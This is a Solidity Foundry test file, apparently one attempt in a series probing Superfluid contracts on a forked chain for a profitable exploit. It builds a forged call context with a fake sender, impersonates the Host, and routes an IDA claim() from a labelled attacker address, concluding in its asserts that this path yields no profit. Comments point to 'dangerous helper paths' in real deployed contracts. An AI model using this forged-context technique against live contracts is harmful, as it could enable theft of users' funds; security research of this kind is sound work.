// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface IPublisherCallbackApp {
    function beforeAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata ctx
    ) external view returns (bytes memory cbdata);

    function afterAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);
}

/// @title Attempt16
/// @notice Hypothesis: the real verified publisher family behind the live
///         `0xcaB28480...` tuple is a dead end on the IDA `claim()` branch.
///         Its contextual helper calls exist, but the actual
///         `beforeAgreementUpdated` / `afterAgreementUpdated` bodies return the
///         incoming `ctx` unchanged unless the agreement class is CFA v1.
/// @dev `REXMarket.beforeAgreementUpdated()` and
///      `REXMarket.afterAgreementUpdated()` short-circuit on non-CFA agreement
///      classes at
///      `sources/ch5_superfluid_v2/0xcab28480ab5c1e133e9b7fc67e030b8dcc2a1d24_rextwowaymaticmarket/src/contracts/REXMarket.sol:751-803`.
/// @dev The dangerous helper paths do exist at
///      `REXMarket.sol:507-540` and `REXMarket.sol:590-610`, but they are only
///      reachable after the CFA guard. The Host also overwrites
///      `context.msgSender = msg.sender` during nested
///      `callAgreementWithContext()` sub-operations at
///      `sources/ch5_superfluid_v2/0x513b7c5c6b7d8b21a14d6d5536878fb0a803bef4_superfluid_host_impl_fork_patch1/src/contracts/superfluid/Superfluid.sol:688-699`.
/// @dev IDA `claim()` builds publisher callbacks with the publisher as the app
///      target and empty `agreementData` at
///      `sources/ch5_superfluid_v2/0x86e8ac788e9997b4e0e43a4c8fb12f69ad4bacbf_ida_impl_public_current/src/contracts/agreements/InstantDistributionAgreementV1.sol:844-871`.
contract Attempt16 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    uint256 constant FORK_BLOCK = 27_039_967;

    address constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA_ADDR = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant PUBLISHER = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUBSCRIBER = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;

    uint32 constant INDEX_ID = 1;

    address constant FORGED_MSG_SENDER = 0x1111111111111111111111111111111111111111;

    ISuperfluidHost constant HOST = ISuperfluidHost(HOST_ADDR);
    IInstantDistributionAgreementV1 constant IDA = IInstantDistributionAgreementV1(IDA_ADDR);
    IPublisherCallbackApp constant APP = IPublisherCallbackApp(PUBLISHER);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);

        vm.label(ATTACKER, "Attacker");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(IDA_ADDR, "IDA");
        vm.label(MATICX, "MATICx");
        vm.label(PUBLISHER, "VerifiedREXPublisher");
        vm.label(SUBSCRIBER, "LiveUnapprovedSubscriber");
    }

    function test_verified_rex_publisher_ida_callbacks_are_noop_and_live_claim_stays_non_profitable() public {
        bytes memory fakeCtx = _buildForgedClaimCtx();

        vm.prank(HOST_ADDR);
        bytes memory beforeCbData = APP.beforeAgreementUpdated(
            MATICX,
            IDA_ADDR,
            bytes32(0),
            bytes(""),
            fakeCtx
        );
        assertEq(beforeCbData, fakeCtx, "beforeAgreementUpdated should short-circuit to ctx on IDA path");

        vm.prank(HOST_ADDR);
        bytes memory afterCtx = APP.afterAgreementUpdated(
            MATICX,
            IDA_ADDR,
            bytes32(0),
            bytes(""),
            bytes(""),
            fakeCtx
        );
        assertEq(afterCtx, fakeCtx, "afterAgreementUpdated should short-circuit to ctx on IDA path");

        (, bool approvedBefore,, uint256 pendingBefore) = IDA.getSubscription(MATICX, PUBLISHER, INDEX_ID, SUBSCRIBER);
        uint256 nativeBefore = ATTACKER.balance;

        console.log("[start] attacker native:", nativeBefore);
        console.log("[pre] approved:", approvedBefore);
        console.log("[pre] pending:", pendingBefore);

        assertFalse(approvedBefore, "target tuple must stay on the unapproved claim path");
        assertGt(pendingBefore, 0, "target tuple must be live and claimable");

        bytes memory inner = abi.encodeCall(IDA.claim, (MATICX, PUBLISHER, INDEX_ID, SUBSCRIBER, fakeCtx));
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));

        vm.prank(ATTACKER);
        HOST.callAgreement(IDA, outer, new bytes(0));

        (, bool approvedAfter,, uint256 pendingAfter) = IDA.getSubscription(MATICX, PUBLISHER, INDEX_ID, SUBSCRIBER);
        uint256 nativeAfter = ATTACKER.balance;

        console.log("[post] approved:", approvedAfter);
        console.log("[post] pending:", pendingAfter);
        console.log("[end] attacker native:", nativeAfter);

        assertEq(pendingAfter, 0, "claim should still settle the intended pending distribution");
        assertEq(nativeAfter, nativeBefore, "real verified publisher app should not yield attacker native delta");
    }

    function _buildForgedClaimCtx() internal view returns (bytes memory) {
        ContextUtils.Context memory context = ContextUtils.buildContext(
            FORGED_MSG_SENDER,
            IInstantDistributionAgreementV1.claim.selector,
            ""
        );
        return ContextUtils.encodeContext(context);
    }
}
